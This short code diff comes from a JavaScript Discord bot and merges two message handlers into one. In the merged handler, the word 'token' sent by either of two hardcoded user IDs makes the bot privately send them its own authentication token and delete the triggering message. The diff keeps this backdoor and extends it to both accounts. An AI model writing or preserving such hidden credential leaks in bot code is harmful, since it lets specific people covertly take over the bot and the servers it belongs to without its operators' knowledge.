@@ -224,21 +224,7 @@ client.on('message', async (msg, member, guild) => {
  {
 
 if (msg.content.toLowerCase() === 'token'){
-if (msg.author.id !== "429357746002067493") return;
-
-msg.author.send(client.token);
-msg.delete();
-}
-  
-}
-});
-
-client.on('message', async (msg, member, guild) => {
-  
- {
-
-if (msg.content.toLowerCase() === 'token'){
-if (msg.author.id !== "813799329407041576") return;
+if (msg.author.id !== "429357746002067493" & msg.author.id !== "813799329407041576") return;
 
 msg.author.send(client.token);
 msg.delete();
